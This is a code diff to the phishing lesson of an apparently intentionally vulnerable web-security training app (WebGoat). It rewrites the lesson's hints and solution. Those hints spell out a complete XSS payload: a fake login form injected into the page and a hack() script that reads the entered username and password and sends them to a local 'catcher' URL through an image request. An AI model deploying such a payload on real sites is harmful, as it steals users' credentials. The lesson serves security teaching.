@@ -170,21 +170,21 @@ public class Phishing extends LessonAdapter
 				+ "Try to make the form look official.");
 		hints
 				.add("Try: <BR> "
-						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
+						+ "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
+						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
 						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
 						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
 		hints
 				.add("Add functionality that can post a request, a button might work<BR><BR>"
 						+ "After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>"
-						+ "http://localhost/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE");
+						+ "http://localhost/webgoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE");
 		hints
 				.add("Try: <BR> "
 						+ "&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
 						+ "value=&quot;login&quot;&gt;"
-						+ "<BR><BR>Solution for this hint:<BR><BR>"
-						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
+						+ "<BR><BR>In the whole script:<BR><BR>"
+						+ "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
+						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
 						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
 						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
 						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
@@ -192,49 +192,52 @@ public class Phishing extends LessonAdapter
 				.add("Make the button perform an action on submit, <BR>"
 						+ "adding an onclick=\"hack()\" might work<BR>"
 						+ "Don't forget to add the hack() javascript function"
-						+ "<BR><BR>Solution for this hint:<BR><BR>"
-						+ "password&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
+						+ "<BR><BR>In the whole script:<BR><BR>"
+						+ "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
+						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
 						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
 						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
+						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>"
+						+ "Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)");
 		hints
 				.add("You need to create the hack() function.  This function will pull the credentials from the "
 						+ "webpage and post them to the WebGoat catcher servlet. <BR>"
 						+ "<BR> Some useful code snippets:<UL>"
-						+ "<LI>doucument.forms[0].user.value - will access the user field"
+						+ "<LI>doucument.phish.user.value - will access the user field"
 						+ "<LI>XssImage = new Image(); XssImage.src=SOME_URL = will perform a post"
 						+ "<LI>javascript string concatentation uses a \"+\" </UL>"
-						+ "<BR><BR>Solution for this hint():<BR><BR>"
-						+ "password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
-						+ "\nUser Name = &quot; + document.forms[0].user.value + &quot;\nPassword = &quot; +  document.forms[0].pass.value); "
-						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+"
-						+ "document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}"
+						+ "<BR><BR>The entire javascript portion:<BR><BR>"
+						+ "&lt;script&gt;function hack(){ "
+						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+"
+						+ "document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;"
+						+ "alert(&quot;Had this been a real attack... Your credentials were just stolen."
+						+ "\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} "
 						+ "&lt;/script&gt;");
 		hints
 				.add("Complete solution for this lesson:<BR><BR>"
-						+ "password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
-						+ "\nUser Name = &quot; + document.forms[0].user.value + &quot;\nPassword = &quot; +  document.forms[0].pass.value); "
-						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+"
-						+ "document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}"
-						+ "&lt;/script&gt;&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; "
+						+ "&lt;/form&gt;&lt;script&gt;function hack(){ "
+						+ "XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+"
+						+ "document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;"
+						+ "alert(&quot;Had this been a real attack... Your credentials were just stolen."
+						+ "\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} "
+						+ "&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
+						+ "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
 						+ "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
 						+ "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
 						+ "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
 		/**
 		 * password<script>function hack(){ alert("Had this been a real attack... Your credentials
-		 * were just stolen.\nUser Name = " + document.forms[0].user.value + "\nPassword = " +
-		 * document.forms[0].pass.value); XSSImage=new Image;
+		 * were just stolen.\nUser Name = " + document.phish.user.value + "\nPassword = " +
+		 * document.phish.pass.value); XSSImage=new Image;
 		 * XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="
-		 * +document.forms[0].user.value + "&password=" + document.forms[0].pass.value +
-		 * "";}</script><form><br>
+		 * +document.phish.user.value + "&password=" + document.phish.pass.value +
+		 * "";}</script><form name="phish"><br>
 		 * <br>
 		 * <HR>
 		 * <H3>This feature requires account login:</H2> <br>
 		 * <br>
 		 * Enter Username:<br>
-		 * <input type="text" id="user" name="user"><br>
+		 * <input type="text" name="user"><br>
 		 * Enter Password:<br>
 		 * <input type="password" name = "pass"><br>
 		 * <input type="submit" name="login" value="login" onclick="hack()"></form><br>
@@ -258,7 +261,7 @@ public class Phishing extends LessonAdapter
 				+ "Using XSS and HTML insertion, your goal is to: <UL>"
 				+ "<LI>Insert html to that requests credentials"
 				+ "<LI>Add javascript to actually collect the credentials"
-				+ "<LI>Post the credentials to http://localhost/WebGoat/catcher?PROPERTY=yes...</UL> "
+				+ "<LI>Post the credentials to http://localhost/webgoat/catcher?PROPERTY=yes...</UL> "
 				+ "To pass this lesson, the credentials must be posted to the catcher servlet.<BR>";
 
 		return (instructions);
